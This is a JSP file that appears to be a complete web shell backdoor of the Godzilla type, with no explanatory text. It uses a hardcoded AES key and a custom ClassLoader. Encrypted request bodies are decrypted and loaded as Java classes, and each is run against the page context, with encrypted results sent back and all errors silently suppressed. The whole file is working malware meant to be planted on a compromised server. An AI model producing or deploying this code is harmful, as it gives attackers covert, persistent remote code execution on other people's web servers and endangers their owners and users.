<%! String xc = "748007e861908c03";

    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[]
                               cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher
                    c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new
                    javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }%>
<%
    try {
        byte[] data = new byte[Integer.parseInt(request.getHeader("Content-Length"))];
        java.io.InputStream
                inputStream = request.getInputStream();
        int _num = 0;
        while
        ((_num += inputStream.read(data, _num, data.length)) < data.length) ;
        data = x(data, false);
        if
        (session.getAttribute("payload") == null) {
            session.setAttribute("payload", new
                    X(this.getClass().getClassLoader()).Q(data));
        } else {
            request.setAttribute("parameters", data);
            Object
                    f = ((Class) session.getAttribute("payload")).newInstance();
            java.io.ByteArrayOutputStream arrOut = new
                    java.io.ByteArrayOutputStream();
            f.equals(arrOut);
            f.equals(pageContext);
            f.toString();
            response.getOutputStream().write(x(arrOut.toByteArray(),
                    true));
        }
    } catch (Exception e) {
    }
%>